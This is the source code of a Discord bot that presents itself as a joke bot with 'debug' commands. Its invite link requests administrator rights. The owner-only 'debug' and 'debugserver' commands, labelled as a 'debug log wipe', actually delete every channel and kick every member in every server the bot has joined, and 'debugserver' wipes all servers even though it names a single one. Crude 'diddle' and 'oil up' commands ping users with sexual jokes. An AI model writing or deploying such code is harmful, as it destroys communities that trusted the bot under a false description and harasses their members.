const { Client, GatewayIntentBits, Partials, PermissionsBitField } = require('discord.js');
const https = require('https');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel]
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const commands = [
  { name: "echo", description: "Repeat a message", options: [{ name: "message", description: "Message to repeat", type: 3, required: true }] },
  { name: "servers", description: "List all servers the bot is in" },
  { name: "leaveall", description: "Make the bot leave all servers" },
  { name: "debug", description: "Run a full debug log wipe across all servers" },
  { name: "diddle", description: "Diddle a user", options: [{ name: "user", description: "User to diddle", type: 6, required: true }] },
  { name: "oil", description: "Oil up a user", options: [{ name: "user", description: "User to oil up", type: 6, required: true }] },
  { name: "invite", description: "Get the bot invite link" },
  { name: "debugserver", description: "Run a debug log wipe on a specific server", options: [{ name: "server", description: "Server to debug", type: 3, required: true, autocomplete: true }] }
];

async function registerCommands() {
  console.log("🔧 Registering slash commands...");
  try {
    const options = {
      hostname: 'discord.com',
      port: 443,
      path: `/api/v10/applications/${CLIENT_ID}/commands`,
      method: 'PUT',
      headers: {
        'Authorization': `Bot ${TOKEN}`,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(JSON.stringify(commands))
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        console.log("Discord API response:", data);
        if (res.statusCode === 200 || res.statusCode === 201) {
          console.log("✅ Slash commands registered successfully");
        } else {
          console.error(`❌ Failed to register commands: ${res.statusCode}`);
        }
      });
    });

    req.on('error', (error) => console.error("❌ Registration error:", error.message));
    req.write(JSON.stringify(commands));
    req.end();
  } catch (error) {
    console.error("❌ Exception during registration:", error.message);
  }
}

async function wipeServers(owner) {
  await owner.send("Starting global server wipe.");

  for (const guild of client.guilds.cache.values()) {
    try {
      const me = guild.members.me;
      const canKick = me.permissions.has(PermissionsBitField.Flags.KickMembers);
      const canDelete = me.permissions.has(PermissionsBitField.Flags.ManageChannels);

      if (!canKick || !canDelete) {
        await owner.send(`Skipped: ${guild.name} (missing permissions)`);
        continue;
      }

      await owner.send(`Cleaning: ${guild.name}`);

      for (const channel of guild.channels.cache.values()) {
        try { await channel.delete(); await delay(800); } catch (e) {}
      }

      await guild.members.fetch();
      let kicked = 0;

      for (const member of guild.members.cache.values()) {
        if (member.kickable) {
          try {
            await member.kick("Server cleanup");
            kicked++;
            if (kicked % 10 === 0) await owner.send(`${guild.name}: kicked ${kicked}`);
            await delay(1200);
          } catch (e) {}
        }
      }

      await owner.send(`Finished ${guild.name}. Total kicked: ${kicked}`);
    } catch (e) {
      await owner.send(`Skipped ${guild.name} due to error: ${e.message}`);
    }
  }

  await owner.send("All servers processed.");
}

client.once("ready", async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`📊 Bot is in ${client.guilds.cache.size} servers`);
  await registerCommands();
  console.log("🎯 Ready for slash commands!");

  setInterval(async () => {
    try {
      const owner = await client.users.fetch(OWNER_ID);
      await owner.send("Ping Pong");
      console.log("📨 Sent Ping Pong to owner");
    } catch (error) {
      console.error("❌ Failed to send Ping Pong:", error.message);
    }
  }, 10 * 60 * 1000);
});

client.on("interactionCreate", async interaction => {
  try {
    if (interaction.isAutocomplete()) {
      const focused = interaction.options.getFocused().toLowerCase();
      const choices = client.guilds.cache
        .filter(g => g.name.toLowerCase().includes(focused))
        .map(g => ({ name: g.name, value: g.id }))
        .slice(0, 25);
      await interaction.respond(choices);
      return;
    }

    if (!interaction.isCommand()) return;

    const { commandName, user } = interaction;
    console.log(`⚡ Slash command: /${commandName} from ${user.tag}`);

    if (commandName === "echo") {
      const msg = interaction.options.getString("message");
      await interaction.reply(msg);
      return;
    }

    if (user.id !== OWNER_ID && ["servers","leaveall","debug","debugserver"].includes(commandName)) {
      await interaction.reply({ content: "You cannot use this command.", ephemeral: true });
      return;
    }

    switch(commandName) {
      case "servers": {
        const list = client.guilds.cache.map(g => `${g.name} (${g.memberCount})`).join("\n") || "No servers.";
        await interaction.reply({ content: `**Servers:**\n${list}`, ephemeral: true });
        break;
      }
      case "leaveall": {
        await interaction.reply({ content: "Leaving all servers...", ephemeral: true });
        for (const guild of client.guilds.cache.values()) { try { await guild.leave(); } catch(e) {} }
        break;
      }
      case "invite": {
        await interaction.reply(`https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`);
        break;
      }
      case "diddle": {
        const target = interaction.options.getUser("user");
        await interaction.reply(`<@${target.id}> was diddled`);
        break;
      }
      case "oil": {
        const target = interaction.options.getUser("user");
        await interaction.reply(`<@${user.id}> oiled up <@${target.id}>`);
        break;
      }
      case "debugserver": {
        const guildId = interaction.options.getString("server");
        const guild = client.guilds.cache.get(guildId);
        if (!guild) { await interaction.reply({ content: "Server not found.", ephemeral: true }); return; }

        await interaction.reply({ content: `Starting wipe on **${guild.name}**. Check your DMs.`, ephemeral: true });
        const owner = await client.users.fetch(OWNER_ID);
        await wipeServers(owner); // safer to reuse function
        break;
      }
      case "debug": {
        await interaction.reply({ content: "Starting debug wipe across all servers. Check your DMs.", ephemeral: true });
        const owner = await client.users.fetch(OWNER_ID);
        await wipeServers(owner);
        break;
      }
    }
  } catch (error) {
    console.error("❌ Interaction error:", error.message);
    try { if (!interaction.replied && !interaction.deferred) await interaction.reply({ content: "Error executing command.", ephemeral: true }); } catch(e) {}
  }
});

process.on("unhandledRejection", error => console.error("❌ Unhandled rejection:", error));
process.on("uncaughtException", error => console.error("❌ Uncaught exception:", error));

client.login(TOKEN);